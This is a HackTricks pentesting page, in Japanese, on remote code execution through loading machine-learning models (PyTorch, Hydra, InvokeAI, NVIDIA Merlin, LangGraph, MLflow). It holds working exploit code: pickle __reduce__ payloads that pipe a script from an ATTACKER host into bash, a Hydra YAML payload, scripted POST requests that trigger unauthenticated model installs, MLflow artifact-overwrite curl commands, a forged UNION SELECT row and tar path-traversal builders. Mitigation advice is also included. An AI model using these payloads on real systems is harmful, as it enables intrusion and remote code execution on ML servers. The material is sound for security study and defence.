# Models RCE

{{#include ../banners/hacktricks-training.md}}

## モデルの読み込みによる RCE

Machine Learning モデルは、ONNX、TensorFlow、PyTorch など、さまざまな形式で共有されます。これらのモデルは、開発者のマシンや本番システムに読み込まれ、利用されます。通常、モデルに悪意のあるコードが含まれることはありませんが、意図された機能として、あるいはモデル読み込みライブラリの脆弱性によって、モデルからシステム上で任意のコードが実行される場合があります。

このカテゴリに該当する代表的な脆弱性を以下の表に示します。

| **Framework / Tool**        | **脆弱性（該当する場合は CVE）**                                                    | **RCE の手法**                                                                                                                           | **参考情報**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` における安全でないデシリアライゼーション* **(CVE-2025-32434)**                                                              | 悪意のある pickle を含むモデルチェックポイントによりコードが実行される（`weights_only` による保護を回避）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF と悪意のあるモデルのダウンロードによってコードが実行される。管理 API での Java デシリアライゼーションによる RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` による安全でないチェックポイントのデシリアライゼーション **(CVE-2025-23298)**                                           | 信頼できないチェックポイントが `load_model_trainer_states_from_checkpoint` 中に pickle reducer を実行し、ML worker 上でコードを実行する            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + 安全でない MessagePack 拡張フック **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | ユーザー制御の `filter` キーで SQL/JSON-path 構文を注入し、`UNION SELECT` で偽の checkpoint 行を生成。その後、`msgpack` のデシリアライゼーションで攻撃者が選んだ Python コードを import して呼び出す | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (安全でない YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML からモデルを読み込む際に `yaml.unsafe_load` が使用される（コード実行） <br> **Lambda** layer を含むモデルを読み込むと任意の Python コードが実行される          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 細工された `.tflite` モデルが整数オーバーフローを引き起こし、heap corruption に至る（RCE の可能性）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` でモデルを読み込むと、攻撃者の `__reduce__` payload を含む pickle が実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` の安全でない使用) *disputed*                                                                              | `numpy.load` はデフォルトで pickle 化された object 配列を許可していたため、悪意のある `.npy/.npz` によってコードが実行される                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX モデルの external-weights path を使ってディレクトリ外にアクセスできる（任意のファイルを読み取り） <br> 悪意のある ONNX model tar が任意のファイルを上書きする（RCE につながる） | |
| ONNX Runtime (design risk)  | *(CVE なし)* ONNX custom ops / control flow                                                                                    | custom operator を含むモデルでは攻撃者の native code を読み込む必要がある。複雑なモデルグラフがロジックを悪用し、意図しない計算を実行する   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` を有効にした状態で model-load API を使用すると、相対 path traversal によるファイル書き込みが可能（例：RCE のために `.bashrc` を上書き）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (複数の heap overflow)                                                                         | 不正な GGUF model file が parser で heap buffer overflow を引き起こし、被害者のシステム上で任意のコードを実行可能にする                     | |
| **Keras (older formats)**   | *(新たな CVE なし)* Legacy Keras H5 model                                                                                         | Lambda layer を含む悪意のある HDF5 (`.h5`) model は、読み込み時に依然としてコードを実行する（Keras safe_mode は旧形式を対象としない「downgrade attack」） | |
| **その他** (一般)        | *設計上の欠陥* – Pickle serialization                                                                                         | 多くの ML ツール（例：pickle ベースの model format、Python `pickle.load`）は、対策がなければ model file に埋め込まれた任意のコードを実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | 信頼できない metadata を `hydra.utils.instantiate()` に渡す **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻撃者が制御する model metadata/config で `_target_` に任意の callable（例：`builtins.exec`）を設定し、「safe」な形式（`.safetensors`、`.nemo`、repo `config.json`）であっても読み込み時に実行される | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security) で使用されるものなど、Python pickle ベースのモデルには、`weights_only=True` を指定せずに読み込むと、システム上で任意のコードを実行できるものがあります。そのため、表に記載されていないものも含め、pickle ベースのモデルはこの種の攻撃に特に弱い可能性があります。

### Hydra metadata → RCE（safetensors でも有効）

`hydra.utils.instantiate()` は、設定/metadata オブジェクト内のドット区切りの `_target_` を import して呼び出します。Hugging Face Transformers などのライブラリが**信頼できない model metadata**を `instantiate()` に渡す場合、攻撃者はモデル読み込み時に即座に実行される callable と引数を指定できます（pickle は不要です）。<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload の例（`.nemo` の `model_config.yaml`、repo の `config.json`、または `.safetensors` 内の `__metadata__` で動作）:

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

主なポイント:
- NeMo の `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders では、model initialization の前にトリガーされる。
- Hydra の string block-list は、代替の import paths（例: `enum.bltns.eval`）や、アプリケーションが解決した名前（例: `nemo.core.classes.common.os.system` → `posix`）を使って回避できる。<sup>[[14]](#references)</sup>
- FlexTok は `ast.literal_eval` で文字列化された metadata も解析するため、Hydra の呼び出し前に DoS（CPU/memory の過剰消費）が発生する可能性がある。

### 🆕  `torch.load` 経由の InvokeAI RCE（CVE-2024-12029）

`InvokeAI` は Stable-Diffusion 用の人気のあるオープンソース web interface です。バージョン **5.3.1 – 5.4.2** では、ユーザーが任意の URL から model をダウンロードしてロードできる REST endpoint `/api/v2/models/install` が公開されています。<sup>[[1]](#references)</sup>

内部では、この endpoint は最終的に次を呼び出します。

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

指定されたファイルが **PyTorch checkpoint (`*.ckpt`)** の場合、`torch.load` は **pickle のデシリアライズ**を実行します。コンテンツはユーザーが制御する URL から直接取得されるため、攻撃者は checkpoint 内にカスタム `__reduce__` メソッドを持つ悪意あるオブジェクトを埋め込めます。このメソッドは **デシリアライズ中に実行**され、InvokeAI サーバー上で **remote code execution (RCE)** につながります。

この脆弱性には **CVE-2024-12029** が割り当てられました（CVSS 9.8、EPSS 61.17 %）。

#### Exploitation walk-through

1. 悪意ある checkpoint を作成します:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` を自分が管理する HTTP server（例: `http://ATTACKER/payload.ckpt`）でホストします。
3. 脆弱な endpoint をトリガーします（認証は不要）。

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI がファイルをダウンロードすると、`torch.load()` を呼び出します → `os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストでコード実行を得ます。

既成の exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` が一連の流れを自動化します。<sup>[[3]](#references)</sup>

#### 条件

•  InvokeAI 5.3.1-5.4.2（scan flag のデフォルトは **false**）
•  `/api/v2/models/install` に攻撃者がアクセスできる
•  プロセスに shell commands を実行する権限がある

#### 緩和策

* **InvokeAI ≥ 5.4.3** にアップグレードする – patch により `scan=True` がデフォルトに設定され、deserialization の前に malware scanning が実行されます。<sup>[[2]](#references)</sup>
* チェックポイントをプログラムからロードする場合は、`torch.load(file, weights_only=True)` または新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper を使用します。
* model source と signature に allow-list を適用し、least-privilege でサービスを実行します。

> ⚠️ 信頼できない source から deserialize する場合、Python pickle ベースの形式（多くの `.pt`、`.pkl`、`.ckpt`、`.pth` ファイルを含む）は**すべて**本質的に安全ではないことに注意してください。

---

古い InvokeAI バージョンを reverse proxy の背後で稼働させ続ける必要がある場合の、場当たり的な緩和策の例:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec: unsafe `torch.load` による RCE (CVE-2025-23298)

NVIDIA の Transformers4Rec（Merlin の一部）には、ユーザー指定のパスに対して直接 `torch.load()` を呼び出す、安全でない checkpoint loader がありました。`torch.load` は Python の `pickle` に依存するため、攻撃者が細工した checkpoint は、デシリアライズ中に reducer を介して任意コードを実行できます。<sup>[[5]](#references)</sup>

脆弱なパス（修正前）: `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

RCE に至る理由: Python の pickle では、オブジェクトに reducer（`__reduce__`/`__setstate__`）を定義し、callable と引数を返させることができます。unpickle 中にその callable が実行されます。このようなオブジェクトが checkpoint に含まれていると、重みが使用される前に実行されます。

最小限の悪意ある checkpoint の例:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

配布経路と被害範囲:
- リポジトリ、バケット、アーティファクトレジストリを通じて共有される、トロイの木馬化されたチェックポイント／モデル
- チェックポイントを自動ロードする、resume/deploy の自動化パイプライン
- 実行はトレーニング／推論ワーカー内で行われ、しばしば高い権限（例: コンテナ内の root）で実行される

修正: コミット [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）では、直接的な `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された、制限付きで許可リスト方式のデシリアライザーに置き換えました。新しいローダーは型／フィールドを検証し、ロード時に任意の callable が呼び出されるのを防ぎます。<sup>[[7]](#references)</sup>

PyTorch チェックポイントに特化した防御ガイダンス:
- 信頼できないデータを unpickle しないでください。可能な場合は、[Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX など、実行可能コードを含まない形式を優先してください。
- PyTorch のシリアライゼーションを使う必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を使用するか、Transformers4Rec のパッチに類似した、許可リスト方式のカスタム unpickler を使用してください。<sup>[[4]](#references)</sup>
- モデルの来歴／署名を検証し、デシリアライズをサンドボックス化してください（seccomp/AppArmor、非 root ユーザー、ファイルシステムの制限、ネットワークへの送信禁止）。
- チェックポイントのロード時に、ML サービスから予期しない子プロセスが生成されていないか監視してください。`torch.load()`／`pickle` の使用状況を追跡してください。

POC と脆弱版／パッチの参照:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- パッチ適用前の脆弱なローダー: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- 悪意あるチェックポイントの POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- パッチ適用後のローダー: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## 例 – 悪意ある PyTorch モデルの作成

- モデルを作成する:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- モデルをロードする:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD には、ユーザーが制御するデータをデシリアライズする `resnet` エンドポイントがあります。ZDI は、リモートの攻撃者が被害者に悪意のあるページ／ファイルを読み込ませ、細工したシリアライズ済みデータをそのエンドポイントに送信させることで、`root` としてデシリアライズを実行し、システムを完全に侵害できることを確認しました。

この exploit の流れは、一般的な pickle の悪用と同様です。

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

デシリアライズ中に呼び出し可能な gadget（コンストラクター、`__setstate__`、framework の callback など）は、通信手段が HTTP、WebSocket、監視対象ディレクトリに置かれたファイルのいずれであっても、同じ方法で weaponize できます。



### LangGraph checkpointer SQLi → MessagePack RCE

この攻撃チェーンが興味深いのは、攻撃者が**悪意のある model file をアップロードする必要がない**点です。代わりに、アプリケーションが**AI-agent の永続化 API**（`get_state_history(..., filter=...)`）を公開しており、ユーザー入力が checkpointer の query builder に渡されます。

#### 1. metadata filter における構造的 SQLi

脆弱な SQLite のパターンは次のようなものでした。

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

値は後でバインドされますが、`query_key` は **JSON path string** に連結されるため、dictionary key 内の `'` によって `'$.{query_key}'` を抜け出し、SQLを注入できます。同じ教訓は **JSON paths、identifiers、operators、`LIMIT`、TTL fields** にも当てはまります。プレースホルダーで保護されるのは値だけであり、クエリ構文の構造部分は保護されません。

#### 2. `UNION SELECT` はデータ窃取だけでなく、後続の sink も狙える

このクエリは `type` とシリアライズされた `checkpoint` bytes を返し、それらは後で次のように扱われます。

```python
self.serde.loads_typed((type, checkpoint))
```

つまり、`WHERE` clause 内の SQLi によって**偽の結果行**を注入できます:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

後続のコードが選択したカラムを parse、deserialize、write、または execute する場合、それらのカラムを対応する sink にマッピングしてください。このケースでは、偽の行によって SQLi が **attacker-controlled deserialization** に変わります。

#### 3. 安全でない MessagePack extension hook は code gadget と同等

LangGraph の `msgpack` パスでは、ネストされたタプルを unpack して次を実行するカスタム extension hook が使われていました：

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

したがって、`("os", "system", "id > /tmp/pwned")` と同等の内容をエンコードした MessagePack 拡張オブジェクトは、`os` をインポートし、`system` を解決してコマンドを実行します。AI framework をレビューする際は、動的インポート、reflection、任意の callable dispatch を行う**カスタム MessagePack/JSON/pickle reviver**を調査してください。

#### 4. agent framework の実践的な監査パターン

ユーザー制御可能な入力が、次の項目に到達する箇所をレビューしてください。
- state history / memory / replay / checkpoint listing API
- SQL または Redis query fragment を生成する構造化 filter builder
- カスタム deserializer（`pickle`、`msgpack`、`json` object hook、YAML constructor）
- persistence layer から返された行を信頼する復旧処理

この特定の chain は、信頼できないユーザーが `filter` を制御できる場合に、**SQLite** または **Redis** checkpointer を使う self-hosted LangGraph deployment に影響しました。開示で言及された修正済みバージョンは、`langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+`、`langgraph-checkpoint 4.0.1+` です。<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact の上書きによる pickle RCE

`PythonModel` から作成された MLflow PyFunc は、シリアライズされたオブジェクトを `python_model.pkl` として保存できます。モデルの metadata は `mlflow.pyfunc.model` を loader として指定し、MLflow の実装は保存された Python model にこのファイル名を使用します。そのため、artifact store への書き込み権限があると、後からモデルを読み込む別のアプリケーションで code execution が可能になることがあります。<sup>[[17]](#references)[[18]](#references)</sup>

有効な chain は **artifact write permission → pickle の置き換え → inference consumer に再読み込みさせる** ことです。`mlflow-artifacts:/...` という proxied root を使う experiment では、experiment、run、model の artifact path を列挙します。tracking server は `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` に対する `GET` と `PUT` を公開しています。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

最小限のreducerは、consumerがartifactをunpickleするとすぐにコマンドを実行できます。`MLmodel`で宣言されたPythonバージョンでpayloadを生成すると、互換性の問題を回避できます。<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

既存のモデルを**読み込む**操作（prediction、scoring、deployment など）を実行してください。先に再学習すると、悪意のある artifact が新しいモデルに置き換わる可能性があるため、再学習は行わないでください。アプリケーションエラーが発生しても、exploit が失敗したとは限りません。reducer は、使用可能なモデルではなく、コマンドの整数の exit status を返します。まず ICMP や HTTP callback など、確認可能な副作用を試してから、最終的な payload に置き換えてください。<sup>[[20]](#references)</sup>

評価時には、run の作成権限と、別の run に属する artifact の上書き権限を区別してください。認証と run ごとの更新権限を確認し、`python_model.pkl` の予期しない変更を調べ、モデルの来歴と完全性を実行境界の一部として扱ってください。現在の MLflow のコードでは `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` の設定もサポートされており、cloudpickle データを読み込む代わりに models-from-code artifact を使用することが推奨されています。<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Models to Path Traversal

[**このブログ記事**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)で説明されているように、さまざまな AI framework で使用されるモデル形式の大半は archive（通常は `.zip`）をベースにしています。そのため、これらの形式を悪用して Path Traversal 攻撃を実行し、モデルが読み込まれるシステムから任意のファイルを読み取れる可能性があります。<sup>[[16]](#references)</sup>

たとえば、次のコードを使うと、読み込み時に `/tmp` ディレクトリ内にファイルを作成するモデルを作成できます。

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

または、次のコードを使うと、ロード時に`/tmp`ディレクトリへのsymlinkを作成するモデルを作成できます:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### 詳細解説: Keras .keras のデシリアライズと gadget 探索

.keras の内部構造、Lambda-layer RCE、≤ 3.8 における任意 import の問題、および修正後の allowlist 内での gadget 発見に関する詳しいガイドは、こちらを参照してください:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog –「CVE-2024-12029 – InvokeAI における信頼できないデータのデシリアライズ」](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI の patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module のドキュメント](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load のセキュリティ上の考慮事項](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 NVIDIA Merlin で Remote Code Execution を実現](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec の patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [修正前の脆弱な loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [悪意のある checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [修正後の loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – 最新の AI/ML フォーマットとライブラリを使った Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate のドキュメント](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (RCE に関する警告)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi から RCE へ: LangGraph の Checkpointer を悪用する](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip のバグを高額な AI/ML バウンティにつなげる](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk advisory と PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow source – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact のダウンロードおよびアップロード用 endpoint](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
